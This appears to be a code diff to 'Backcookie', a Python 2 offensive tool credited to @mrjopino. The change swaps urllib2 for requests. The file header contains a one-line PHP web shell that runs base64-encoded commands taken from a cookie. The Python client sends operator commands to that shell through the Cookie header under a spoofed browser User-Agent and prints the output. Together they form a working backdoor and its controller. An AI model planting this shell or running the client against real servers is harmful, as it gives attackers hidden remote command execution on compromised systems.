@@ -9,8 +9,8 @@
 import os                                     #
 import sys                                    #
 import optparse                               #
+import requests                               #
 from sys import argv                          #
-from urllib2 import build_opener, HTTPHandler #
 ############################################################################
 #                                                                          #
 # Code: <?php error_reporting(0); system(base64_decode($_COOKIE["1"])); ?> ###
@@ -49,7 +49,6 @@ class core:
     bc = 'Backcookie'
     ua = 'User-Agent'
     ck = 'Cookie'
-    vc = '={0}'
     eb = 'base64'
 
 def Error():
@@ -60,23 +59,22 @@ def Error():
 	print color.blue + "[-] " + color.red  + "Error:" +  color.yellow + " " + "Connection! \n" + color.white
 	exit(0)
 
-def backcookie(command,host,cookie,vcmd,debugLevel=0):
-	o = build_opener(HTTPHandler(debuglevel=debugLevel))
-	o.addheaders = [
-		(core.ua, "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1)"),
-		(core.ck, cookie + core.vc.format(command.encode(core.eb)))
-	]
+def backcookie(command, host, cookie, vcmd):
+	headers = {
+	           core.ua: 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1)', 
+	           core.ck: cookie + '=' + command.encode(core.eb)
+	          }
 	try:
-		l = o.open(host)
-		v = l.headers.values() # v > validate
+		r = requests.get(host, headers=headers)
+		v = r.headers.values()
 	except:
 		Error()
 	if v[0] == "0" or vcmd == "command": # vcmd > validate command
-		print color.blue + l.read().strip() + color.white
+		print color.blue + r.text.strip() + color.white
 	else:
 		Error()
 
-def shell(host,cookie):
+def shell(host, cookie):
 	backcookie("cd",host,cookie,"")
 	print color.white + "\t\t-------------" + color.red + core.bc + color.white + "------------"
 	print "\t\t+    Developed by: @mrjopino      +"
